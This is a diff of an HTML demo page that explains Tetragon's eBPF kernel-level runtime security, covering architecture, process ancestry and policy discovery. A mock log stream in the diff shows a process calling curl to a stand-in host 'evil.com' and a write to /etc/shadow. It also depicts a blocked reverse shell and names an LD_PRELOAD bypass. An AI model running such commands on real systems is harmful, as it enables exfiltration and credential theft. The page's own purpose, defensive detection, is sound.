@@ -101,7 +101,7 @@
             border: 1px solid var(--cisco-platinum); border-left: 4px solid var(--cisco-blue);
         }
 
-        /* --- Sequential Perspectives --- */
+        /* --- Sequential Perspectives Styles --- */
         .view-section { margin-bottom: 60px; }
         .view-title { 
             color: var(--cisco-midnight); font-size: 1.6rem; margin-bottom: 25px; 
@@ -114,6 +114,66 @@
             background: #F0F7FA; border-left: 4px solid var(--cisco-blue);
             padding: 25px; border-radius: 0 var(--radius-md) var(--radius-md) 0;
             margin: 30px 0;
+        }
+
+        /* --- Ancestry Tree Styles --- */
+        .ancestry-container {
+            display: flex; flex-direction: column; align-items: flex-start;
+            padding: 40px; background: #F8FAFC; border-radius: 12px;
+            border: 1px dashed var(--cisco-platinum); position: relative;
+        }
+        .ancestry-node {
+            display: flex; align-items: center; gap: 15px;
+            background: white; padding: 12px 20px; border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05); margin-bottom: 30px;
+            border: 1px solid var(--cisco-platinum); position: relative;
+            min-width: 280px; z-index: 2;
+        }
+        .ancestry-node::after {
+            content: ''; position: absolute; left: 35px; top: 100%;
+            width: 2px; height: 30px; background: var(--cisco-blue);
+        }
+        .ancestry-node:last-child::after { display: none; }
+        .ancestry-node.alert { border: 2px solid var(--cisco-red); background: #FFF5F5; }
+        .ancestry-node.alert::after { background: var(--cisco-red); }
+        .node-icon { 
+            width: 32px; height: 32px; border-radius: 6px; 
+            display: flex; align-items: center; justify-content: center;
+            background: var(--cisco-midnight); color: white;
+        }
+        .node-info { flex: 1; }
+        .node-name { font-weight: 700; font-size: 0.9rem; color: var(--cisco-midnight); }
+        .node-meta { font-size: 0.75rem; color: var(--cisco-slate); }
+        .node-tag { 
+            font-size: 10px; padding: 2px 6px; border-radius: 4px; 
+            background: var(--cisco-light-gray); margin-left: auto;
+            text-transform: uppercase; font-weight: bold;
+        }
+
+        /* --- Policy Discovery Interactive Styles --- */
+        .discovery-card {
+            background: #FFFFFF; border: 1px solid var(--cisco-platinum);
+            border-radius: 12px; padding: 0; overflow: hidden;
+            display: grid; grid-template-columns: 1.2fr 1fr; gap: 0;
+            box-shadow: var(--shadow-card); margin-bottom: 40px;
+        }
+        .log-side { background: #1A1F2B; padding: 25px; color: #ADBAC7; font-family: 'Courier New', monospace; font-size: 0.85rem; border-right: 1px solid #30363D; }
+        .policy-side { background: #FFFFFF; padding: 25px; position: relative; }
+        .log-line { margin-bottom: 10px; border-left: 2px solid #444; padding-left: 12px; opacity: 0.7; transition: all 0.3s; }
+        .log-line.highlight { opacity: 1; border-left-color: var(--cisco-blue); background: rgba(4, 159, 217, 0.1); }
+        .policy-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; }
+        
+        .pulse-wave { animation: pulse-border 2s infinite; }
+        @keyframes pulse-border {
+            0% { box-shadow: 0 0 0 0 rgba(108, 194, 74, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(108, 194, 74, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(108, 194, 74, 0); }
+        }
+
+        .yaml-transfer { animation: slide-up 0.5s cubic-bezier(0.18, 0.89, 0.32, 1.28); }
+        @keyframes slide-up {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
 
         /* --- Mechanism Description Blocks --- */
@@ -132,6 +192,9 @@
         }
         .terminal-bar { background: #2A2A2A; padding: 12px; display: flex; gap: 8px; align-items: center; }
         .traffic-light { width: 12px; height: 12px; border-radius: 50%; }
+        .traffic-light.red { background: #ff5f56; }
+        .traffic-light.yellow { background: #ffbd2e; }
+        .traffic-light.green { background: #27c93f; }
         .terminal-content { padding: 20px; min-height: 250px; color: #EEE; font-size: 14px; overflow-y: auto; }
         .prompt { color: var(--cisco-green); font-weight: bold; }
         .alert-text { color: var(--cisco-red); font-weight: bold; background: rgba(226, 35, 26, 0.1); padding: 2px 6px; border-radius: 4px; }
@@ -227,17 +290,40 @@
             line-height: 1.6;
         }
 
-        .btn-primary { background: var(--cisco-blue); color: white; border: none; padding: 14px 32px; border-radius: 30px; font-weight: 600; cursor: pointer; transition: 0.2s; box-shadow: 0 4px 12px rgba(4, 159, 217, 0.3); }
-        .btn-primary:hover { background: #0087BF; transform: translateY(-2px); }
-        .btn-outline { background: transparent; border: 2px solid var(--cisco-blue); color: var(--cisco-blue); padding: 14px 32px; border-radius: 30px; font-weight: 600; cursor: pointer; transition: 0.2s; }
-        .btn-outline:hover { background: var(--cisco-blue); color: white; }
-        
-        .case-badge { background: var(--cisco-midnight); color: white; padding: 4px 12px; border-radius: 4px; font-size: 0.8rem; font-weight: 700; margin-bottom: 15px; display: inline-block; text-transform: uppercase; }
+        /* --- BEAUTIFIED CASE BADGE --- */
+        .case-badge { 
+            background: linear-gradient(135deg, var(--cisco-midnight) 0%, #005073 100%);
+            color: white; 
+            padding: 5px 16px; 
+            border-radius: 50px; 
+            font-size: 0.75rem; 
+            font-weight: 700; 
+            margin-bottom: 15px; 
+            display: inline-block; 
+            text-transform: uppercase; 
+            letter-spacing: 1.2px;
+            border: 1px solid rgba(4, 159, 217, 0.4);
+            box-shadow: 0 4px 10px rgba(13, 39, 77, 0.2);
+            position: relative;
+        }
+        .case-badge::before {
+            content: '';
+            position: absolute;
+            left: 8px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 4px;
+            height: 4px;
+            background: var(--cisco-blue);
+            border-radius: 50%;
+            display: none; /* 可选：增加一个小圆点装饰 */
+        }
 
         @media (max-width: 768px) {
             h1 { font-size: 2.2rem; }
             .grid-3, .grid-4, .dash-grid { grid-template-columns: 1fr; }
             .final-conclusion { padding: 60px 0; }
+            .discovery-card { grid-template-columns: 1fr; }
         }
     </style>
 </head>
@@ -260,13 +346,13 @@
                 <span class="lang-en">In modern IT architectures, perimeter firewalls are no longer enough. Tetragon utilizes eBPF technology to embed security deep into the Linux kernel for true real-time enforcement.</span>
             </p>
             <div style="display:flex; gap:16px;">
-                <button class="btn-primary" onclick="scrollToId('lab-section')">启动演练实验室</button>
-                <button class="btn-outline" style="border-color:white; color:white;" onclick="scrollToId('how-it-works')">技术原理</button>
+                <button class="btn-primary" onclick="scrollToId('lab-section')" style="background: var(--cisco-blue); color: white; border: none; padding: 14px 32px; border-radius: 30px; font-weight: 600; cursor: pointer;">启动演练实验室</button>
+                <button class="btn-outline" style="background: transparent; border: 2px solid white; color: white; padding: 14px 32px; border-radius: 30px; font-weight: 600; cursor: pointer;" onclick="scrollToId('how-it-works')">技术原理</button>
             </div>
         </div>
     </header>
 
-    <!-- Section 1: Definition of Runtime Security -->
+    <!-- Section 1: Definition & Dimensions -->
     <section id="what-is-runtime">
         <div class="container">
             <div class="section-header">
@@ -295,19 +381,19 @@
             <div class="view-section">
                 <div class="view-title">主要监控维度</div>
                 <div class="grid-4">
-                    <div class="card" style="border-top-color: var(--cisco-blue);">
+                    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                         <strong>进程执行</strong>
                         <p style="font-size: 0.9rem;">追踪二进制文件的全生命周期：谁启动了程序？是否派生了非法的子进程或 Shell？</p>
                     </div>
-                    <div class="card" style="border-top-color: var(--cisco-blue);">
+                    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                         <strong>文件访问</strong>
                         <p style="font-size: 0.9rem;">监控关键路径：敏感配置文件（如 <code>/etc/shadow</code>）是否被未授权篡改或非法读取？</p>
                     </div>
-                    <div class="card" style="border-top-color: var(--cisco-blue);">
+                    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                         <strong>网络通信</strong>
                         <p style="font-size: 0.9rem;">感知连接意图：进程是否建立了非预期的外连或尝试访问恶意的 C2 域名？</p>
                     </div>
-                    <div class="card" style="border-top-color: var(--cisco-blue);">
+                    <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                         <strong>特权变更</strong>
                         <p style="font-size: 0.9rem;">识别越权行为：普通用户进程是否突然提权变成 Root？是否发生了异常的 Capability 变更？</p>
                     </div>
@@ -316,47 +402,17 @@
         </div>
     </section>
 
-    <!-- [NEWLY EXPANDED SECTION START]: What is Tetragon -->
+    <!-- Section 2: Tetragon & TracingPolicy -->
     <section id="what-is-tetragon" style="background: #F9FAFB;">
         <div class="container">
             <div class="section-header">
-                <h2>
-                    <span class="lang-zh">什么是 Tetragon?</span>
-                    <span class="lang-en">What is Tetragon?</span>
-                </h2>
-                <p>
-                    <span class="lang-zh">Tetragon 是 Cilium 开源社区下的核心项目，它利用 <b>eBPF</b> 技术提供深度的内核级安全观测。不同于传统的安全工具，它能感知 <b>Kubernetes 身份</b>（Pod, Namespace, Labels），并在恶意行为发生的瞬间在内核态将其阻断。传统安全依赖用户态 Agent，容易被绕过。Tetragon 挂载在内核执行路径的核心点（如 LSM 或系统调用入口），提供“不可绕过”的审计一致性。</span>
-                    <span class="lang-en">Tetragon is a core project under Cilium community, utilizing <b>eBPF</b> for deep kernel-level security observability. It's K8s-aware and enforces security in kernel mode.</span>
-                </p>
-            </div>
-
-            <div class="grid-3">
-                <div class="card" style="border-top-color: var(--cisco-blue);">
-                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color:var(--cisco-blue); margin-bottom:15px;"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                    <h4>内核级过滤</h4>
-                    <p style="font-size: 0.95rem; margin-top:10px;">在数据进入用户态前完成筛选，极低开销。规避了用户态切换导致的检测延迟。</p>
-                </div>
-                <div class="card" style="border-top-color: var(--cisco-midnight);">
-                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color:var(--cisco-midnight); margin-bottom:15px;"><rect x="2" y="2" width="20" height="20" rx="2"/><path d="M7 2v20M17 2v20M2 12h20"/></svg>
-                    <h4>K8s 全感知</h4>
-                    <p style="font-size: 0.95rem; margin-top:10px;">自动关联进程与容器/Pod 身份。让底层系统调用具备完整的集群业务语义。</p>
-                </div>
-                <div class="card" style="border-top-color: var(--cisco-red);">
-                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color:var(--cisco-red); margin-bottom:15px;"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>
-                    <h4>实时阻断</h4>
-                    <p style="font-size: 0.95rem; margin-top:10px;">非事后告警，而是即时预防。在恶意代码实际执行前，直接从内核层切断连接或杀死进程。</p>
-                </div>
+                <h2>什么是 Tetragon?</h2>
+                <p>Tetragon 是 Cilium 开源社区下的核心项目，它利用 <b>eBPF</b> 技术提供深度的内核级安全观测。不同于传统的安全工具，它能感知 <b>Kubernetes 身份</b>（Pod, Namespace, Labels），并在恶意行为发生的瞬间在内核态将其阻断。传统安全依赖用户态 Agent，容易被绕过。Tetragon 挂载在内核执行路径的核心点（如 LSM 或系统调用入口），提供“不可绕过”的审计一致性。</p>
             </div>
 
             <div class="view-section" style="margin-top: 60px;">
-                <div class="view-title">
-                    <span class="lang-zh">核心灵魂：TracingPolicy</span>
-                    <span class="lang-en">The Soul: TracingPolicy</span>
-                </div>
-                <p>
-                    <span class="lang-zh">TracingPolicy 是一种 CRD（自定义资源声明），它定义了两个关键要素：</span>
-                    <span class="lang-en">TracingPolicy is a CRD that defines two critical elements for enforcement:</span>
-                </p>
+                <div class="view-title">核心灵魂：TracingPolicy</div>
+                <p>TracingPolicy 是一种 CRD（自定义资源声明），它定义了两个关键要素：</p>
                 <div class="grid-3" style="margin-top:24px;">
                     <div class="definition-card">
                         <strong>触发条件 (Trigger)</strong>
@@ -369,21 +425,14 @@
                 </div>
 
                 <div class="expert-persp-box">
-                    <h4>
-                        <span class="lang-zh">专家视角 (Expert Perspective):</span>
-                        <span class="lang-en">Expert Insight:</span>
-                    </h4>
-                    <p style="font-size: 1rem; margin-top:15px; opacity:0.95;">
-                        <span class="lang-zh">Tetragon 使用 <b>Kprobes</b> 和 <b>Tracepoints</b> 拦截内核事件。通过 <b>BPF Maps</b> 将内核数据高效传递至用户态的 Tetragon Agent 及其导出的 JSON 日志。这种架构确保了在微秒级别捕获并处理威胁，而不产生明显的业务抖动。</span>
-                        <span class="lang-en">Tetragon utilizes <b>Kprobes</b> and <b>Tracepoints</b> to intercept kernel events. Data is efficiently transferred via <b>BPF Maps</b> to the Tetragon Agent and JSON logs, enabling microsecond-level threat mitigation.</span>
-                    </p>
+                    <h4>专家视角 (Expert Perspective):</h4>
+                    <p style="font-size: 1rem; margin-top:15px; opacity:0.95;">Tetragon 使用 <b>Kprobes</b> 和 <b>Tracepoints</b> 拦截内核事件。通过 <b>BPF Maps</b> 将内核数据高效传递至用户态的 Tetragon Agent 及其导出的 JSON 日志。这种架构确保了在微秒级别捕获并处理威胁，而不产生明显的业务抖动。</p>
                 </div>
             </div>
         </div>
     </section>
-    <!-- [NEWLY EXPANDED SECTION END] -->
 
-    <!-- Section 2: Sequential Perspectives (Existing) -->
+    <!-- Section 3: Perspectives (Business & Technical) -->
     <section id="perspectives">
         <div class="container">
             <div class="view-section">
@@ -428,68 +477,88 @@
         </div>
     </section>
 
-    <!-- Section 3: Technical Architecture -->
+    <!-- Section 4: Technical Architecture (LSM Enhanced SVG) -->
     <section id="how-it-works" style="background: white;">
         <div class="container">
             <div class="section-header">
-                <h2>
-                    <span class="lang-zh">技术架构：Tetragon 的运行逻辑</span>
-                    <span class="lang-en">Architecture: How Tetragon Operates</span>
-                </h2>
-                <p><span class="lang-zh">下图展示了 Tetragon 如何在内核层拦截一次恶意提权企图。</span><span class="lang-en">The diagram below shows how Tetragon intercepts a privilege escalation attempt at the kernel layer.</span></p>
+                <h2>技术架构：Tetragon 的运行逻辑</h2>
+                <p>下图展示了 Tetragon 如何利用 <b>kprobes</b> 进行深度观测，并利用内核 <b>LSM BPF</b> 实现不可绕过的安全阻断。</p>
             </div>
             
             <div style="background: #F9FAFB; padding: 40px; border-radius: 16px; box-shadow: inset 0 2px 10px rgba(0,0,0,0.05); text-align: center;">
-                <!-- SVG Architecture -->
-                <svg width="100%" height="350" viewBox="0 0 800 350" xmlns="http://www.w3.org/2000/svg">
+                <svg width="100%" height="450" viewBox="0 0 800 450" xmlns="http://www.w3.org/2000/svg">
                     <defs>
                         <marker id="arrow-blue" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#049FD9" /></marker>
                         <marker id="arrow-red" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto"><path d="M0,0 L0,6 L9,3 z" fill="#E2231A" /></marker>
+                        <filter id="glow" x="-20%" y="-20%" width="140%" height="140%"><feGaussianBlur stdDeviation="3" result="blur"/><feComposite in="SourceGraphic" in2="blur" operator="over"/></filter>
                     </defs>
-                    <!-- User Space -->
                     <rect x="50" y="20" width="700" height="100" rx="8" fill="#F0F8FC" stroke="#049FD9" stroke-width="2" stroke-dasharray="5,5"/>
-                    <text class="lang-zh" x="65" y="45" font-weight="bold" fill="#0D274D">User Space (用户空间)</text>
-                    <text class="lang-en" x="65" y="45" font-weight="bold" fill="#0D274D">User Space</text>
+                    <text x="65" y="45" font-weight="bold" fill="#0D274D">User Space (用户空间)</text>
                     <circle cx="200" cy="70" r="25" fill="white" stroke="#049FD9" stroke-width="2"/>
                     <text x="200" y="74" text-anchor="middle" font-size="12" fill="#049FD9">App</text>
-                    
-                    <!-- Kernel Space -->
-                    <rect x="50" y="160" width="700" height="160" rx="8" fill="#0D274D" />
-                    <text class="lang-zh" x="65" y="185" font-weight="bold" fill="white">Kernel Space (内核空间)</text>
-                    <text class="lang-en" x="65" y="185" font-weight="bold" fill="white">Kernel Space</text>
-
-                    <!-- Flow -->
+                    <rect x="50" y="160" width="700" height="260" rx="8" fill="#0D274D" />
+                    <text x="65" y="185" font-weight="bold" fill="white">Kernel Space (内核空间)</text>
                     <line x1="200" y1="95" x2="200" y2="200" stroke="#049FD9" stroke-width="3" marker-end="url(#arrow-blue)"/>
-                    <text x="210" y="140" fill="#58585B" font-size="12">1. Syscall (open/write)</text>
-
-                    <!-- Hook -->
-                    <rect x="150" y="210" width="120" height="70" rx="4" fill="#005073" stroke="#6CC24A" stroke-width="2"/>
-                    <text x="210" y="240" text-anchor="middle" fill="white" font-weight="bold">eBPF Hook</text>
-                    <text x="210" y="260" text-anchor="middle" fill="#6CC24A" font-size="11">kprobe/sys_open</text>
-
-                    <!-- Tetragon Engine -->
-                    <line x1="270" y1="245" x2="380" y2="245" stroke="#6CC24A" stroke-width="2" stroke-dasharray="4"/>
-                    <rect x="380" y="210" width="180" height="70" rx="4" fill="#6CC24A"/>
-                    <text x="470" y="240" text-anchor="middle" fill="#0D274D" font-weight="bold">Policy Engine</text>
-                    <text class="lang-zh" x="470" y="260" text-anchor="middle" fill="#0D274D" font-size="11">匹配安全策略...</text>
-                    <text class="lang-en" x="470" y="260" text-anchor="middle" fill="#0D274D" font-size="11">Matching Policy...</text>
-
-                    <!-- Enforcement -->
-                    <line x1="560" y1="245" x2="630" y2="245" stroke="white" stroke-width="2"/>
-                    <rect x="630" y="210" width="100" height="70" rx="4" fill="#E2231A"/>
-                    <text x="680" y="240" text-anchor="middle" fill="white" font-weight="bold">SIGKILL</text>
-                    <text x="680" y="260" text-anchor="middle" fill="white" font-size="11">Signal -9</text>
-
-                    <!-- Blocking Line -->
-                    <path d="M 680 210 Q 680 120 230 70" fill="none" stroke="#E2231A" stroke-width="2" marker-end="url(#arrow-red)"/>
-                    <text class="lang-zh" x="520" y="100" fill="#E2231A" font-weight="bold">2. 拦截并杀死进程</text>
-                    <text class="lang-en" x="520" y="100" fill="#E2231A" font-weight="bold">2. Intercept & Kill</text>
+                    <text x="210" y="145" fill="#58585B" font-size="12">1. Syscall Entry</text>
+                    <rect x="120" y="210" width="160" height="60" rx="4" fill="#005073" stroke="#049FD9" stroke-width="2"/>
+                    <text x="200" y="235" text-anchor="middle" fill="white" font-weight="bold">kprobe Hook</text>
+                    <text x="200" y="255" text-anchor="middle" fill="#049FD9" font-size="11" font-weight="bold">【观测：收集上下文】</text>
+                    <path d="M 280 240 L 380 240" stroke="#049FD9" stroke-width="2" stroke-dasharray="4"/>
+                    <rect x="380" y="210" width="180" height="140" rx="4" fill="#6CC24A"/>
+                    <text x="470" y="270" text-anchor="middle" fill="#0D274D" font-weight="bold" font-size="16">Policy Engine</text>
+                    <rect x="120" y="320" width="160" height="60" rx="4" fill="#E2231A" filter="url(#glow)"/>
+                    <text x="200" y="345" text-anchor="middle" fill="white" font-weight="bold">LSM BPF Hook</text>
+                    <text x="200" y="365" text-anchor="middle" fill="#FFDADA" font-size="11" font-weight="bold">【阻断：不可绕过】</text>
+                    <line x1="200" y1="270" x2="200" y2="320" stroke="#E2231A" stroke-width="3" marker-end="url(#arrow-red)"/>
+                    <path d="M 380 340 L 280 340" stroke="#E2231A" stroke-width="2" stroke-dasharray="4"/>
+                    <rect x="580" y="320" width="100" height="60" rx="4" fill="#E2231A"/>
+                    <text x="630" y="355" text-anchor="middle" fill="white" font-weight="bold">SIGKILL</text>
+                    <path d="M 280 350 Q 450 400 630 380" fill="none" stroke="#E2231A" stroke-width="2" marker-end="url(#arrow-red)"/>
                 </svg>
+            </div>
+
+            <div class="mechanism-card">
+                <div class="expert-persp-box" style="margin-top:20px; border-left-color: var(--cisco-red); background: #FFF5F5; color: var(--cisco-midnight);">
+                    <strong>LSM BPF 阻断 vs 用户态 LD_PRELOAD 劫持</strong>
+                    <p style="font-size: 0.95rem; margin-top:10px; opacity:0.9;">基于 <b>LD_PRELOAD</b> 的用户态劫持极其脆弱，攻击者只需使用静态链接的二进制文件或执行 <code>unset LD_PRELOAD</code> 即可轻易绕过监控。而 Tetragon 挂载于内核 <b>LSM BPF</b> 接口。无论攻击者如何尝试修改路径或环境变量，只要触碰系统资源，就必须触发检查。这提供了物理层面的“审计一致性”且对攻击者完全透明。</p>
+                </div>
             </div>
         </div>
     </section>
 
-    <!-- Section 4: Defense Scenarios & Value -->
+    <!-- Section 5: Ancestry -->
+    <section id="ancestry-context" style="background: #FFFFFF;">
+        <div class="container">
+            <div class="section-header">
+                <h2>深度上下文与进程溯源</h2>
+                <p>在安全审计中，仅知道“谁被杀了”是不够的，你必须知道它“从哪儿来”。Tetragon 通过 eBPF 维护了内核态的进程状态表，即使中间父进程已退出，依然能完整回溯整个攻击路径。</p>
+            </div>
+            <div style="display: flex; flex-wrap: wrap; gap: 40px; align-items: center;">
+                <div style="flex: 1; min-width: 320px;">
+                    <div class="ancestry-container">
+                        <div class="ancestry-node"><div class="node-icon">C</div><div class="node-info"><div class="node-name">containerd-shim</div><div class="node-meta">PID: 1024</div></div><div class="node-tag">Runtime</div></div>
+                        <div class="ancestry-node"><div class="node-icon" style="background: var(--cisco-blue);">S</div><div class="node-info"><div class="node-name">entrypoint.sh</div><div class="node-meta">PID: 1025</div></div><div class="node-tag">Init</div></div>
+                        <div class="ancestry-node"><div class="node-icon" style="background: var(--cisco-orange);">J</div><div class="node-info"><div class="node-name">java -jar app.jar</div><div class="node-meta">PID: 1080</div></div><div class="node-tag">App</div></div>
+                        <div class="ancestry-node alert"><div class="node-icon" style="background: var(--cisco-red);">B</div><div class="node-info"><div class="node-name">/bin/bash (Reverse Shell)</div><div class="node-meta">PID: 2550</div></div><div class="node-tag" style="background: var(--cisco-red); color: white;">Blocked</div></div>
+                    </div>
+                </div>
+                <div style="flex: 1; min-width: 320px;">
+                    <h3>解决传统日志碎片化难题</h3>
+                    <p>传统工具依赖进程事件流的拼接。如果一个中间层脚本在攻击发生前就退出，审计日志会失去关联。Tetragon 利用 BPF Map 保证了证据链的完整性与不可伪造性。</p>
+                    <div class="highlight-box">
+                        <strong>Tetragon 的 BPF 状态机优势：</strong>
+                        <ul style="font-size: 0.95rem; list-style: none; margin-top: 10px;">
+                            <li style="margin-bottom: 8px;">✅ <b>内核态持久化：</b> 进程信息不受退出的影响。</li>
+                            <li style="margin-bottom: 8px;">✅ <b>身份识别联动：</b> 自动关联 K8s Pod 标签。</li>
+                            <li>✅ <b>不可伪造：</b> 数据来源于内核 <code>task_struct</code> 遍历。</li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- [RESTORED FULL CONTENT]: 应用场景与防御价值 (Value) -->
     <section id="scenarios" style="background: #F9FAFB;">
         <div class="container">
             <div class="section-header">
@@ -497,72 +566,82 @@
                 <p>将安全策略下沉到内核，构建不可绕过的运行时防御边界。</p>
             </div>
             <div class="grid-4">
-                <div class="card" style="border-top-color: var(--cisco-red);">
+                <div class="card" style="border-top: 4px solid var(--cisco-red);">
                     <strong>深度防御 (Security)</strong>
                     <ul style="font-size: 0.85rem; list-style: none; margin-top:10px;">
-                        <li style="margin-bottom:8px;">• <b>文件篡改：</b> 监控 <code>/etc/passwd</code> 的 <code>write</code> 行为，拦截持久化驻留。</li>
-                        <li style="margin-bottom:8px;">• <b>反弹 Shell：</b> 监控 <code>connect</code> 和 <code>execve</code>，禁止非白名单外连。</li>
-                        <li>• <b>容器逃逸：</b> 强制执行 Namespace 隔离，禁止非法的宿主机挂载。</li>
+                        <li style="margin-bottom:8px;">• <b>文件篡改：</b> 监控 <code>/etc/passwd</code>, <code>/etc/shadow</code> 等敏感配置文件的 <code>write</code> 行为。</li>
+                        <li style="margin-bottom:8px;">• <b>反弹 Shell：</b> 监控 <code>connect</code> 调用，禁止非白名单地址的外连企图。</li>
+                        <li>• <b>容器逃逸：</b> 检测异常的 Namespace 挂载行为，强制执行边界隔离。</li>
                     </ul>
                 </div>
-                <div class="card" style="border-top-color: var(--cisco-sky);">
+                <div class="card" style="border-top: 4px solid var(--cisco-sky);">
                     <strong>安全合规 (Compliance)</strong>
-                    <p style="font-size: 0.85rem; margin-top: 10px;">检测容器内执行 <code>curl</code> 或 <code>apt-get</code> 等违规命令。通过行为白名单确保生产环境的“不可变性”。</p>
+                    <p style="font-size: 0.85rem; margin-top: 10px;">实时检测容器内执行 <code>curl</code>, <code>apt-get</code>, <code>wget</code> 等违规运维命令。通过行为白名单确保生产环境的“不可变性（Immutability）”，满足 SOC2/PCI-DSS 合规性审计。</p>
                 </div>
-                <div class="card" style="border-top-color: var(--cisco-blue);">
+                <div class="card" style="border-top: 4px solid var(--cisco-blue);">
                     <strong>故障排查 & 零信任</strong>
-                    <p style="font-size: 0.85rem; margin-top: 10px;">通过监控 TCP SYN 重传，定位网络延迟。基于进程身份执行“最小权限访问”策略。</p>
+                    <p style="font-size: 0.85rem; margin-top: 10px;">通过监控 TCP SYN 重传定位网络延迟瓶颈。基于 Kubernetes 身份执行“最小权限访问”策略，确保进程只能访问声明的外部域名。</p>
                 </div>
-                <div class="card" style="border-top-color: var(--cisco-midnight);">
+                <div class="card" style="border-top: 4px solid var(--cisco-midnight);">
                     <strong>取证分析 (Forensics)</strong>
-                    <p style="font-size: 0.85rem; margin-top: 10px;">入侵发生后，通过 Tetragon 的祖先进程树回溯攻击者的横向移动轨迹和指令序列。</p>
+                    <p style="font-size: 0.85rem; margin-top: 10px;">入侵发生后，利用 Tetragon 的深度祖先进程树回溯攻击者的横向移动轨迹、指令执行序列及环境变量指纹，提供法庭级证据链。</p>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- Section 5: Network Observability -->
-    <section>
+    <!-- Section 7: Policy Discovery -->
+    <section id="policy-discovery" style="background: white; border-bottom: 1px solid var(--cisco-platinum);">
         <div class="container">
             <div class="section-header">
-                <h2>性能优势与网络观测</h2>
-                <p>利用 eBPF 实现零 Sidecar 的高性能网络观测，深度解构 L3 到 L7（DNS, TLS）流量。</p>
+                <h2>策略发现：从观测到防御的自动化转化</h2>
+                <p>安全策略不应靠手动猜测。Tetragon 可以通过观测业务在测试环境的正常行为，自动发现并提炼安全策略。</p>
             </div>
-            <div style="display: flex; flex-wrap: wrap; gap: 40px; align-items: flex-start;">
-                <div style="flex: 1; min-width: 320px;">
-                    <h3>L7 层级无代理监控</h3>
-                    <p>Tetragon 不需要 Sidecar 代理即可追踪 L3/L4 流量及 DNS、TLS 握手。通过监控 TCP SYN 重传，运维团队可以即时定位由底层网络导致的连接超时。</p>
-                    <div class="dashboard-mock">
-                        <div class="dash-grid">
-                            <div class="dash-widget"><span class="dash-label">TCP Retransmits</span><span class="dash-value" style="color:var(--cisco-orange)">14</span></div>
-                            <div class="dash-widget"><span class="dash-label">DNS Success Rate</span><span class="dash-value">99.8%</span></div>
-                            <div class="dash-widget"><span class="dash-label">TLS SNI Identified</span><span class="dash-value">42</span></div>
-                            <div class="dash-widget"><span class="dash-label">P99 Latency</span><span class="dash-value">0.8ms</span></div>
-                        </div>
+            <div class="discovery-card">
+                <div class="log-side" id="log-view">
+                    <div style="color: #6CC24A; margin-bottom: 15px; font-weight: bold;">[OBSERVABILITY LOG STREAM]</div>
+                    <div class="log-line">{"process": "java", "op": "exec", "target": "whoami"}</div>
+                    <div class="log-line highlight">{"process": "java", "op": "exec", "target": "curl", "args": ["evil.com"]}</div>
+                    <div class="log-line">{"process": "nginx", "op": "connect", "dest": "10.0.0.1"}</div>
+                    <div class="log-line highlight">{"process": "bash", "op": "write", "path": "/etc/shadow"}</div>
+                </div>
+                <div class="policy-side">
+                    <div class="policy-header">
+                        <strong style="color: var(--cisco-midnight);">TracingPolicy 预览</strong>
+                        <span id="discovery-status" style="font-size: 0.75rem;">待生成...</span>
+                    </div>
+                    <div id="policy-container" style="height: 220px; border: 1px solid #E4E4E4; border-radius: 8px; padding: 15px; background: #FAFAFA; overflow: hidden;">
+                        <div id="empty-policy-text" style="text-align: center; color: #999; padding-top: 80px;">点击下方按钮提取策略</div>
+                        <div id="generated-yaml" style="display: none; font-family: monospace; font-size: 0.8rem; white-space: pre; color: #333;">
+<span style="color: #005cc5;">apiVersion</span>: <span style="color: #032f62;">cilium.io/v1alpha1</span>
+<span style="color: #005cc5;">kind</span>: <span style="color: #032f62;">TracingPolicy</span>
+<span style="color: #005cc5;">spec</span>:
+  <span style="color: #005cc5;">kprobes</span>:
+  - <span style="color: #005cc5;">call</span>: <span style="color: #032f62;">"sys_execve"</span>
+    <span style="color: #005cc5;">selectors</span>:
+    - <span style="color: #005cc5;">matchBinaries</span>:
+      - <span style="color: #005cc5;">values</span>: [<span style="color: #032f62;">"/usr/bin/curl"</span>]
+      <span style="color: #005cc5;">matchActions</span>:
+      - <span style="color: #005cc5;">action</span>: <span style="color: #d73a49;">Sigkill</span></div>
+                    </div>
+                    <div style="margin-top: 20px; text-align: center;">
+                        <button class="btn-primary" id="discover-btn" onclick="startDiscovery()" style="background: var(--cisco-blue); color: white; border: none; padding: 12px 24px; border-radius: 20px; font-weight: 600; cursor: pointer;">转换为防御策略</button>
                     </div>
                 </div>
-                <div style="flex: 1; min-width: 320px; background: white; padding: 25px; border-radius: 12px; box-shadow: var(--shadow-card);">
-                    <h3>性能损耗对比</h3>
-                    <p style="font-size: 0.9rem;">传统 EDR 方案损耗高达 20%，Tetragon 强制执行损耗 <b>&lt; 1%</b>。</p>
-                    <svg width="100%" height="160" viewBox="0 0 400 160">
-                        <line x1="50" y1="140" x2="350" y2="140" stroke="#CCC" stroke-width="2"/>
-                        <rect x="100" y="30" width="50" height="110" fill="#F58025" opacity="0.8"/><text x="125" y="155" text-anchor="middle" font-size="10">Legacy</text>
-                        <rect x="250" y="132" width="50" height="8" fill="#049FD9"/><text x="275" y="155" text-anchor="middle" font-size="10">Tetragon</text>
-                    </svg>
-                </div>
             </div>
+            <div id="discovery-msg" style="display:none; text-align: center; color: var(--cisco-green); font-weight: bold;">✅ 策略已提取并准备应用至实验室！</div>
         </div>
     </section>
 
